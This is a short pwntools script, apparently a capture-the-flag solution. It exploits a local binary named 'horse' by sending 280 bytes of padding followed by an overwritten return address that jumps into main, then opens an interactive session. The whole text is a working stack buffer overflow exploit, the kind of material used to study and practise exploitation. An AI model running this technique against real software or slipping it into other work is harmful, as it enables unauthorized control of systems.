#!/usr/bin/python3

from pwn import *

exe = ELF('./horse', checksec=False)
context.binary = exe
context.log_level = 'debug'

p = process(exe.path)

payload = b'A'*280 + flat(exe.sym['main'] + 1038)
p.sendlineafter(b'key:\n', payload)

p.interactive()